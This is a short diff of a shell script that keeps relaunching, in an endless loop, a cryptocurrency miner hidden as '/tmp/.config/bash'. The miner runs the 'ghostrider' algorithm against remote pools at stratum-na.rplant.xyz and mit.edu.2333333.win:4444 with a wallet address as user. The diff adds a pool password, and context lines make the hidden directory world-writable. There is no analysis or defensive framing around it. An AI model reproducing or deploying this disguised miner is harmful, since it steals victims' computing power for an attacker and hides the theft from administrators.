@@ -8,7 +8,7 @@ chmod -R  777 /tmp/.config
 #!/bin/sh
 while [ 1 ]; do
 	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099b
- 	/tmp/.config/bash -a ghostrider --url mit.edu.2333333.win:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2099
+ 	/tmp/.config/bash -a ghostrider --url mit.edu.2333333.win:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2099 --pass 5566
 	sleep 5
 done
 
